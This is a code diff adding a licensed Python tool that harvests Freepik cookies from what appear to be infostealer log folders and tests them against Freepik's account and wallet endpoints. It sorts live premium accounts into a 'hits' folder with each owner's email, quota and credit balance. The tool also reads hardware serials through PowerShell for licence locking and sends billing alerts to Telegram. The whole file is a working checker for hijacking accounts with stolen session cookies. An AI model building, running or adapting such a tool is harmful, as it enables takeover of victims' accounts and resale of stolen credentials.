@@ -1,0 +1,810 @@
+import argparse
+import asyncio
+from asyncio import as_completed
+from concurrent.futures import ThreadPoolExecutor
+import datetime
+import hashlib
+import json
+import os
+import re
+import shutil
+import sys
+import threading
+import time
+from pathlib import Path
+from typing import Any, Dict, List, Optional, Tuple
+import subprocess
+
+import aiohttp
+import colorama
+import dateutil
+import requests
+import yarl
+from colorama import Fore, Style, init
+
+# ── CONSTANTS & CLI FLAGS ──────────────────────────────────
+parser = argparse.ArgumentParser(add_help=False)
+parser.add_argument("--max-concurrency", type=int, default=5)
+parser.add_argument("--timeout",          type=int, default=10)
+args, _ = parser.parse_known_args()
+
+MAX_CONCURRENCY = args.max_concurrency
+TIMEOUT = aiohttp.ClientTimeout(total=args.timeout)
+print_lock = threading.Lock()
+
+
+def clear_console():
+    """Clear the console screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# -----------------------------------------------------------------
+
+URL = "https://www.freepik.com/xhr/logged-user-data"
+SAFE_CHARS = re.compile(r"[^A-Za-z0-9@._-]")
+HEADERS_TEMPLATE = {
+    "User-Agent": (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) "
+        "Gecko/20100101 Firefox/137.0"
+    ),
+    "Accept": "application/json",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br, zstd",
+    "Referer": "https://www.freepik.com/user/my-subscriptions?log-in=email",
+    "X-Requested-With": "XMLHttpRequest",
+    "DNT": "1",
+    "Sec-GPC": "1",
+    "Pragma": "no-cache",
+    "Cache-Control": "no-cache",
+}
+SEP_LINE = Fore.WHITE + "-" * 40 + Style.RESET_ALL
+
+init(autoreset=True)  # colour-init
+
+# ── small helpers ──────────────────────────────────────────
+
+def ensure_parent(path: str) -> None:
+    Path(path).parent.mkdir(parents=True, exist_ok=True)
+
+def clean(text: str) -> str:
+    return SAFE_CHARS.sub("_", (text or "NA"))[:60]
+
+def make_filename(info: dict) -> str:
+    return f"{clean(info.get('email', 'NA'))}.txt"
+
+def parse_cookie_file(path: Path) -> dict[str, str]:
+    jar: dict[str, str] = {}
+    with path.open(encoding="utf-8", errors="ignore") as fh:
+        for ln in fh:
+            ln = ln.strip()
+            if ln and not ln.startswith("#"):
+                cols = ln.split("\t")
+                if len(cols) >= 7:               # standard Netscape row
+                    jar[cols[5]] = cols[6]
+                else:                            # fallback “name=value”
+                    k, v = ln.split("=", 1)
+                    jar[k.strip()] = v.strip()
+    return jar
+
+def colour(label: str, value: str) -> str:
+    return f"{Fore.CYAN}{label}{Fore.WHITE} : {value}{Style.RESET_ALL}"
+
+def build_detail_lines(user: dict) -> list[str]:
+    return [colour("Email", user.get("email", "N/A"))]
+
+def build_wallet_lines(wallet: dict, user: dict) -> list[str]:
+    out: list[str] = []
+
+    # premium flags one-liner
+    out.append(
+        Fore.WHITE
+        + " | ".join(
+            [
+                colour("Premium",          str(user.get("premium", False))),
+                colour("Freepik Premium",  str(
+                    user.get("premium_freepik", False))),
+                colour("Flaticon Premium", str(
+                    user.get("premium_flaticon", False))),
+            ]
+        )
+    )
+
+    # downloads
+    out.append(
+        colour(
+            "Downloads",
+            f"{user.get('downloads', 0)}/{user.get('limit_downloads', 0)}",
+        )
+    )
+
+    # purchases
+    if user.get("purchases"):
+        p0 = user["purchases"][0]
+        out.append(colour("Purchase Status", p0.get("status", "N/A")))
+        out.append(colour("Product",         p0.get("product", "N/A")))
+
+    # subscriptions
+    out.append(
+        colour(
+            "Has Subscriptions",
+            str(wallet.get("profile", {}).get("hasSubscriptions", False)),
+        )
+    )
+
+    # credits
+    total = wallet.get("totalCreditsOfPlan", 0)
+    spent = wallet.get("creditsSpend",       0)
+    avail = wallet.get("creditsAvailable",   total - spent)
+    out.append(
+        colour(
+            "Credits",
+            f"Total ({total}) - Spent ({spent}) = Available ({avail})",
+        )
+    )
+
+    # addons if any
+    addons = wallet.get("creditsAddonsAvailable", 0)
+    if addons:
+        out.append(colour("Credits Addons Available", str(addons)))
+
+    return out
+
+
+class RateLimitError(Exception):
+    """Raised when the API says 'Too many requests.'"""
+
+# ── per-cookie task ─────────────────────────────────────────
+
+async def process_cookie(
+    sem:  asyncio.Semaphore,
+    src:  Path,
+    seen: set,
+) -> tuple[str, Path, Path, list[str]]:
+    fname = src.name
+    ck_dict = parse_cookie_file(src)
+
+    jar = aiohttp.CookieJar()
+    jar.update_cookies(ck_dict, response_url=yarl.URL(
+        "https://www.freepik.com"))
+
+    async with sem, aiohttp.ClientSession(timeout=TIMEOUT, cookie_jar=jar) as sess:
+        try:
+            async with sess.get(URL, headers=HEADERS_TEMPLATE) as r:
+                text = await r.text()
+        finally:
+            await sess.close()
+
+    # quick check
+    if "email" not in text:
+        return "invalid", src, Path("bad") / fname, [
+            Fore.RED + f"[Invalid] {fname}" + Style.RESET_ALL,
+            SEP_LINE,
+        ]
+
+    try:
+        wrapper = json.loads(text)
+    except json.JSONDecodeError:
+        return "error", src, Path("bad/error-json") / fname, [
+            Fore.RED + f"[Bad JSON] {fname}" + Style.RESET_ALL,
+            SEP_LINE,
+        ]
+
+    user = wrapper.get("data", {})
+    email, uid = user.get("email"), user.get("id")
+    key = (uid, email)
+
+    if key in seen:
+        return "duplicate", src, Path("bad/duplicate") / make_filename(user), [
+            Fore.WHITE + f"[Duplicate] {fname}" + Style.RESET_ALL,
+            SEP_LINE,
+        ]
+    seen.add(key)
+
+    if not user.get("premium", False):
+        return "free", src, Path("bad/free") / make_filename(user), [
+            Fore.WHITE + f"[Free] {fname}" + Style.RESET_ALL,
+            SEP_LINE,
+        ]
+
+    # premium user → fetch wallet
+    wallet: dict = {}
+    if wid := user.get("wallet_id"):
+        w_url = (
+            f"https://www.freepik.com/user/api/my-subscriptions/wallet-info/{wid}"
+        )
+        w_headers = {
+            "User-Agent": HEADERS_TEMPLATE["User-Agent"],
+            "Accept":    "*/*",
+            "Referer":   "https://www.freepik.com/user/my-subscriptions",
+            "Origin":    "https://www.freepik.com",
+            "DNT":       "1",
+            "Sec-GPC":   "1",
+        }
+        async with aiohttp.ClientSession(timeout=TIMEOUT, cookie_jar=jar) as s2:
+            try:
+                async with s2.get(w_url, headers=w_headers) as wresp:
+                    wtxt = await wresp.text()
+                    if wtxt.strip().startswith("Too many requests."):
+                        raise RateLimitError
+                    wallet = json.loads(wtxt)
+            except Exception:
+                wallet = {}
+
+    lines = (
+        [Fore.GREEN + f"[Valid] {fname}" + Style.RESET_ALL, ""]
+        + build_detail_lines(user)
+        + build_wallet_lines(wallet, user)
+        + [SEP_LINE]
+    )
+
+    return "valid", src, Path("hits") / make_filename(user), lines
+
+# ── async file move helper ─────────────────────────────────
+async def move_file(src: Path, dst: Path) -> None:
+    """Move a file asynchronously."""
+    ensure_parent(dst)
+    base, ext = dst.with_suffix("").as_posix(), dst.suffix
+    i, new_dst = 1, dst
+    while new_dst.exists():
+        new_dst = Path(f"{base}({i}){ext}")
+        i += 1
+    await asyncio.get_running_loop().run_in_executor(None, shutil.move, src, new_dst)
+
+# ---------------------------------------------------------------------------
+#  Telegram & GitHub fetch all silent even error
+# ---------------------------------------------------------------------------
+
+def fetch_data_from_github() -> Optional[Dict[str, Any]]:
+    """Fetch bot management data (Telegram token/channel) from GitHub."""
+    try:
+        url = "https://raw.githubusercontent.com/bijay085/License/refs/heads/master/botmanage.json"
+        response = requests.get(url, timeout=10)
+        response.raise_for_status()
+        return response.json()
+    except requests.RequestException:
+        return None
+
+# ------------------------------------------
+#  Sending billing info to telegram
+# ------------------------------------------
+
+def send_message_to_telegram(message: str, token: str, channel_id: str) -> None:
+    """
+    Send a text message about license status or updates to Telegram.
+    """
+    try:
+        if not token or not channel_id:
+            return
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        requests.post(
+            url,
+            data={'chat_id': channel_id, 'text': message},
+            timeout=60
+        )
+    except Exception:
+        pass
+
+# ---------------------------------------------------------------------------
+#  LICENSE CHECK
+# ---------------------------------------------------------------------------
+
+def get_processor_id() -> Optional[str]:
+    """Return the first non-empty Processor ID from PowerShell output, or None if not found."""
+    try:
+        cmd = [
+            "powershell",
+            "-Command",
+            "(Get-WmiObject Win32_Processor).ProcessorId"
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        lines = [l.strip() for l in result.stdout.splitlines() if l.strip()]
+        if lines:
+            return lines[0]
+    except subprocess.CalledProcessError:
+        pass
+    return None
+
+def get_serial_number() -> Optional[str]:
+    """
+    Return the motherboard serial number (Win32_BaseBoard) if available,
+    otherwise fall back to the BIOS serial (Win32_BIOS). Returns None if neither is found.
+    """
+    try:
+        cmd = [
+            "powershell",
+            "-Command",
+            "(Get-WmiObject Win32_BaseBoard).SerialNumber"
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        mb_sn = result.stdout.strip()
+        # Some motherboards have "To Be Filled By O.E.M." as placeholder
+        if mb_sn and not mb_sn.lower().startswith("to be filled"):
+            return mb_sn
+    except subprocess.CalledProcessError:
+        pass
+
+    # Fallback to BIOS serial if motherboard serial is unavailable
+    try:
+        cmd = [
+            "powershell",
+            "-Command",
+            "(Get-WmiObject Win32_BIOS).SerialNumber"
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        bios_sn = result.stdout.strip()
+        if bios_sn:
+            return bios_sn
+    except subprocess.CalledProcessError:
+        pass
+
+    return None
+
+def load_licenses_from_url(url: str) -> Optional[Any]:
+    """
+    Load license data from the specified URL using a GitHub token if available.
+    Returns the JSON-parsed data or None if an error occurs.
+    """
+    try:
+        token = os.getenv('GITHUB_TOKEN')
+        headers = {'Authorization': f'token {token}'} if token else {}
+        response = requests.get(url, headers=headers, timeout=10)
+        response.raise_for_status()
+        return response.json()
+    except Exception:
+        print("Error loading license file from URL. Contact owner.")
+        input("Press enter to continue...")
+        return None
+
+def check_license_expiration_and_trial(licinfo: Dict[str, Any]) -> bool:
+    """
+    Check license validity and expiration/trial status. Returns True if valid, otherwise False.
+    """
+    if not licinfo.get("valid", False):
+        print(Fore.RED + "This license is blocked or invalid." + Style.RESET_ALL)
+        return False
+
+    # Lifetime license
+    if licinfo.get("lifetime", False):
+        print(Fore.GREEN + "Your license is Lifetime. Enjoy!" + Style.RESET_ALL)
+        return True
+
+    # Next-billing-date
+    nbd_str = licinfo.get("next-billing-date", None)
+    if not nbd_str:
+        print(Fore.RED + "No next billing date found; license data incomplete." + Style.RESET_ALL)
+        return False
+
+    try:
+        dt_nbd = dateutil.parser.parse(nbd_str)
+    except Exception:
+        print(Fore.RED + "Could not parse next-billing-date from license. Exiting." + Style.RESET_ALL)
+        return False
+
+    now = datetime.datetime.now(
+        dt_nbd.tzinfo) if dt_nbd.tzinfo else datetime.datetime.now()
+    diff_days = (dt_nbd - now).days
+
+    # Check if expired
+    if diff_days < 0:
+        print(
+            Fore.RED + f"Your license date is over (Expired on {nbd_str}). Please contact the owner." + Style.RESET_ALL)
+        return False
+
+    # Check trial
+    if licinfo.get("trail", False):
+        print(
+            Fore.CYAN + f"You are in TRIAL mode. Your trial expires in {diff_days} day(s)." + Style.RESET_ALL)
+        return True
+    else:
+        # Normal license with near-expiry
+        if diff_days < 3:
+            print(
+                Fore.YELLOW + f"Your next billing date is very near ({diff_days} day(s) left). Renew soon." + Style.RESET_ALL)
+        return True
+
+# ------------------------------------------
+#  Notify billing status in channel
+# ------------------------------------------
+
+def notify_billing_status(licinfo: Dict[str, Any]) -> None:
+    """
+    Send a Telegram alert if the license is expired or the billing date is near.
+    """
+    data = fetch_data_from_github()
+    if not data:
+        return
+
+    token = data.get('token', '')
+    channel_id = data.get('channel_id', '')
+    if not token or not channel_id:
+        return
+
+    # If user is lifetime, no notification needed
+    if licinfo.get("lifetime", False):
+        return
+
+    nbd_str = licinfo.get("next-billing-date")
+    if not nbd_str:
+        return
+
+    cust_name = licinfo.get("customer-name", "UnknownCustomer")
+    try:
+        dt_nbd = dateutil.parser.parse(nbd_str)
+    except Exception:
+        return
+
+    now = datetime.datetime.now(
+        dt_nbd.tzinfo) if dt_nbd.tzinfo else datetime.datetime.now()
+    diff_days = (dt_nbd - now).days
+
+    if diff_days < 0:
+        msg = f"[ALERT] {cust_name}'s license has EXPIRED. Next billing date was {nbd_str}."
+        send_message_to_telegram(msg, token, channel_id)
+    elif diff_days < 3:
+        msg = f"[ALERT] {cust_name}'s billing date is near ({diff_days} day(s) left)."
+        send_message_to_telegram(msg, token, channel_id)
+
+# ------------------------------------------
+#  Checking license from URL
+# ------------------------------------------
+
+def check_license(license_code: str, url: str) -> Optional[Dict[str, Any]]:
+    """
+    Check the provided license code against remote license data.
+    If valid, save the license code locally and return the license info;
+    otherwise, print an error message and return None.
+    """
+    processor_id = get_processor_id()
+    serial_number = get_serial_number()
+
+    print(f"Local CPU ID = {processor_id}")
+    print(f"Local Serial = {serial_number}")
+
+    if not processor_id and not serial_number:
+        print(
+            "Could not retrieve Processor ID or Serial Number. License cannot be validated.")
+        return None
+
+    licenses = load_licenses_from_url(url)
+    if not licenses:
+        print("Could not fetch license data from server. Contact the owner.")
+        return None
+
+    licinfo = licenses.get(license_code)
+    if not licinfo:
+        print("License code invalid or doesn't match any record.")
+        return None
+
+    if not licinfo.get("valid", False):
+        print("This license is marked invalid (or blocked).")
+        return None
+
+    universal_license = licinfo.get("universal-license", False)
+    expected_processor_id = licinfo.get("processor_id", "")
+    expected_serial_number = licinfo.get("serial_number", "")
+
+    # If universal, just save the code
+    if universal_license:
+        try:
+            with open('license.txt', 'w', encoding='utf-8') as f:
+                f.write(license_code)
+        except Exception as e:
+            print(f"Error writing license file: {e}")
+        return licinfo
+    else:
+        # Must match at least processor or serial
+        has_processor_id = bool(expected_processor_id.strip())
+        has_serial_number = bool(expected_serial_number.strip())
+        if not has_processor_id and not has_serial_number:
+            print(
+                "License record has no processor_id/serial_number but 'universal-license' is False. Invalid.")
+            return None
+
+        match_processor = has_processor_id and (
+            processor_id == expected_processor_id)
+        match_serial = has_serial_number and (
+            serial_number == expected_serial_number)
+
+        if not (match_processor or match_serial):
+            print("Neither Processor ID nor Serial Number matches this license.")
+            return None
+
+        # Save to license.txt
+        try:
+            with open('license.txt', 'w', encoding='utf-8') as f:
+                f.write(license_code)
+        except Exception as e:
+            print(f"Error writing license file: {e}")
+        return licinfo
+
+
+def get_saved_license():
+    """Return the saved license code from 'license.txt' if it exists."""
+    if os.path.exists('license.txt'):
+        with open('license.txt', 'r') as f:
+            return f.read().strip()
+    return None
+
+# ----------------------------------------------------
+# Prompting for license
+# ---------------------------------------------------
+
+def prompt_for_license() -> Optional[Dict[str, Any]]:
+    """
+    Prompt the user for a license code if a saved license is not valid.
+    Returns the license info if valid, otherwise None.
+    """
+    # Points to your remote JSON file containing license data
+    url = 'https://raw.githubusercontent.com/bijay085/License/refs/heads/master/freepikCookieChecker'
+    saved = get_saved_license()
+
+    if saved:
+        print(Fore.CYAN +
+              f"Found saved license code: {saved}" + Style.RESET_ALL)
+        print("Verifying license...")
+        licinfo = check_license(saved, url)
+        if licinfo:
+            return licinfo
+        else:
+            print(
+                Fore.RED + "Saved license is invalid. Will prompt for new code..." + Style.RESET_ALL)
+
+    attempts = 0
+    while attempts < 2:
+        attempts += 1
+        license_code = input("Enter your license code: ").strip()
+        licinfo = check_license(license_code, url)
+        if licinfo:
+            return licinfo
+        else:
+            print(Fore.RED + "License validation failed." + Style.RESET_ALL)
+            if attempts < 2:
+                prompt = input("Try again? (y/n): ").strip().lower()
+                if prompt != 'y':
+                    return None
+    return None
+
+# ---------------------------------------------------------------------------
+#  Log extraction to gather freepik cookies
+# ---------------------------------------------------------------------------
+
+def file_is_cookie(file_path: str) -> bool:
+    """
+    Check if a file's path or name suggests it is a 'cookie' file.
+    """
+    parent = os.path.basename(os.path.dirname(file_path)).lower()
+    fname = os.path.basename(file_path).lower()
+    return ("cookie" in parent or "cookies" in parent or
+            "cookie" in fname or "cookies" in fname)
+
+def remove_exact_duplicate_files(folder_path: str) -> int:
+    """
+    Remove exact-duplicate .txt files in folder_path (by MD5 hash).
+    Returns the count of duplicates removed.
+    """
+    seen_hashes: Dict[str, str] = {}
+    duplicates_removed = 0
+    txt_files = [os.path.join(folder_path, f) for f in os.listdir(
+        folder_path) if f.lower().endswith('.txt')]
+    for fpath in txt_files:
+        try:
+            with open(fpath, "rb") as fp:
+                content = fp.read()
+            file_hash = hashlib.md5(content).hexdigest()
+            if file_hash in seen_hashes:
+                os.remove(fpath)
+                duplicates_removed += 1
+            else:
+                seen_hashes[file_hash] = fpath
+        except Exception as e:
+            print(f"[ERROR] Could not process '{fpath}': {e}")
+    return duplicates_removed
+
+def extract_freepik_cookies() -> None:
+    """
+    Extract freepik cookies from log files by searching for 'freepik.com' in .txt files.
+    Saves extracted lines in the 'cookies' directory and removes exact duplicates.
+    """
+    with print_lock:
+        print(colorama.Fore.CYAN +
+              "\n===== freepik Cookie Extraction from logs =====" + colorama.Style.RESET_ALL)
+
+    logs_dir = input(colorama.Fore.CYAN +
+                     "Enter the path to the folder containing your logs: " + colorama.Style.RESET_ALL).strip()
+    if not os.path.isdir(logs_dir):
+        print(colorama.Fore.RED +
+              f"[ERROR] '{logs_dir}' is not a valid directory. Returning to main menu." + colorama.Style.RESET_ALL)
+        return
+
+    all_txt_files: List[str] = []
+    for root, _, files in os.walk(logs_dir):
+        for fname in files:
+            if fname.lower().endswith(".txt"):
+                full_path = os.path.join(root, fname)
+                all_txt_files.append(full_path)
+
+    if not all_txt_files:
+        print(colorama.Fore.YELLOW +
+              f"No .txt files found in '{logs_dir}'. Returning to main menu." + colorama.Style.RESET_ALL)
+        return
+
+    # Filter any that appear to be 'cookie' files
+    cookie_files = [fp for fp in all_txt_files if file_is_cookie(fp)]
+    if not cookie_files:
+        print(colorama.Fore.YELLOW +
+              "[INFO] No cookie-labeled files found. Returning to main menu." + colorama.Style.RESET_ALL)
+        return
+
+    print(colorama.Fore.CYAN +
+          f"\n[INFO] Found {len(all_txt_files)} total .txt files, of which {len(cookie_files)} are 'cookie' files.\n" + colorama.Style.RESET_ALL)
+    print(colorama.Fore.GREEN +
+          "[INFO] Starting concurrent search for 'freepik.com'..." + colorama.Style.RESET_ALL)
+
+    keyword = "freepik.com"
+    cookies_dir = "cookies"
+    os.makedirs(cookies_dir, exist_ok=True)
+
+    file_results: List[Any] = []
+    total_files = len(cookie_files)
+    done_count = 0
+
+    def search_file_for_keyword(file_path: str, needle: str) -> List[str]:
+        matched_lines: List[str] = []
+        try:
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    if needle in line.lower():
+                        matched_lines.append(line.strip('\n'))
+        except Exception:
+            pass
+        return matched_lines
+
+    with ThreadPoolExecutor() as executor:
+        future_map = {executor.submit(
+            search_file_for_keyword, f, keyword): f for f in cookie_files}
+        for future in as_completed(future_map):
+            file_path = future_map[future]
+            done_count += 1
+            with print_lock:
+                print(
+                    f"  [Progress] Completed {done_count}/{total_files} file(s)...", end="\r")
+            try:
+                matched_lines = future.result()
+                if matched_lines:
+                    file_results.append((file_path, matched_lines))
+            except Exception as e:
+                with print_lock:
+                    print(
+                        colorama.Fore.RED + f"\n[ERROR] Exception searching {file_path}: {e}" + colorama.Style.RESET_ALL)
+
+    print()  # New line after progress
+
+    matched_files_count = 0
+    total_lines_matched = 0
+
+    for i, (file_path, matched_lines) in enumerate(file_results, start=1):
+        matched_files_count += 1
+        total_lines_matched += len(matched_lines)
+        out_name = f"extracted_{i}.txt"
+        out_path = os.path.join(cookies_dir, out_name)
+        try:
+            with open(out_path, "w", encoding="utf-8") as out_f:
+                for line in matched_lines:
+                    out_f.write(line + "\n")
+        except Exception as e:
+            with print_lock:
+                print(colorama.Fore.RED +
+                      f"[ERROR] Could not write to '{out_path}': {e}" + colorama.Style.RESET_ALL)
+
+    duplicates_removed = remove_exact_duplicate_files(cookies_dir)
+
+    with print_lock:
+        print(colorama.Fore.CYAN +
+              "\n===== Freepik Cookie Extraction Summary =====" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.GREEN +
+              f"Total .txt files scanned: {len(all_txt_files)}" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.GREEN +
+              f"Files recognized as 'cookie': {len(cookie_files)}" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.GREEN +
+              f"Files containing '{keyword}': {matched_files_count}" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.GREEN +
+              f"Total lines matched: {total_lines_matched}" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.GREEN +
+              f"Exact-duplicate files removed: {duplicates_removed}" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.GREEN + "-" * 50 + colorama.Style.RESET_ALL)
+
+async def check_cookies_in_dir(dir_path: str) -> None:
+    """Check cookies in the specified directory asynchronously."""
+    paths = [p for p in Path(dir_path).glob("*.txt")]
+    if not paths:
+        print(Fore.YELLOW + "No .txt files found in provided directory." + Style.RESET_ALL)
+        return
+
+    sem = asyncio.Semaphore(MAX_CONCURRENCY)
+    seen: set = set()
+
+    results: List[Tuple[str, Path, Path, List[str]]] = []
+    start_time = time.perf_counter()  # Start timer
+    try:
+        tasks = [process_cookie(sem, p, seen) for p in paths]
+        for coro in asyncio.as_completed(tasks):
+            result = await coro
+            results.append(result)
+            status, src, dst, lines = result
+            with print_lock:
+                for ln in lines:
+                    print(ln)
+            # Move file asynchronously
+            await move_file(src, dst)
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\nInterrupted by user, cleaning up." + Style.RESET_ALL)
+
+    elapsed_time = time.perf_counter() - start_time  # Calculate elapsed time
+
+    # --- summary --------------------------------------------------
+    stats = {
+        "total": len(results),
+        "valid": sum(1 for r in results if r[0] == "valid"),
+        "duplicate": sum(1 for r in results if r[0] == "duplicate"),
+        "free": sum(1 for r in results if r[0] == "free"),
+        "invalid": sum(1 for r in results if r[0] == "invalid"),
+        "error": sum(1 for r in results if r[0] == "error"),
+    }
+
+    print(Fore.CYAN + "\n========================" + Style.RESET_ALL)
+    print("Freepik Cookie Checking Summary\n")
+    print(f"Total cookies: {stats['total']}")
+    print(f"Valid Cookies: {stats['valid']} (Unique: {stats['valid']} | Duplicate: {stats['duplicate']})")
+    print(f"Free Cookies: {stats['free']}")
+    print(f"Invalid Cookies: {stats['invalid']}")
+    print(f"Error: {stats['error']}")
+    print(f"Time Taken: {elapsed_time:.2f}s")
+    print("========================")
+
+def cookie_check_flow() -> None:
+    """Run the async checker for the 'cookies' directory."""
+    dir_path = "cookies"  # Always use the 'cookies' directory
+    if not os.path.isdir(dir_path):
+        print(Fore.RED + f"'{dir_path}' is not a valid directory." + Style.RESET_ALL)
+        input("Press Enter to continue...")
+        return
+    asyncio.run(check_cookies_in_dir(dir_path))
+    input("\nDone. Press Enter to return to menu…")
+
+# ── MAIN ───────────────────────────────────────────────────
+
+def main() -> None:
+    # 1) licence gate
+    licinfo = prompt_for_license()
+    if not licinfo:
+        print("No valid license found. Exiting.")
+        return
+
+    if not check_license_expiration_and_trial(licinfo):
+        print("License check failed or expired. Exiting.")
+        return
+
+    notify_billing_status(licinfo)
+
+    # 2) interactive menu
+    while True:
+        clear_console()
+        print(Fore.CYAN + "===== MAIN MENU =====" + Style.RESET_ALL)
+        print("1. Cookie Check")
+        print("2. Extract Cookies from logs")
+        print("3. Exit")
+
+        choice = input("\nEnter your choice: ").strip()
+        if choice == "1":
+            cookie_check_flow()  # Updated to use the new flow
+        elif choice == "2":
+            extract_freepik_cookies()
+        elif choice == "3":
+            print("Exiting…")
+            sys.exit(0)
+        else:
+            print("Invalid choice. Please try again.")
+            input("Press Enter to continue...")
+
+# program entry
+if __name__ == "__main__":
+    main()
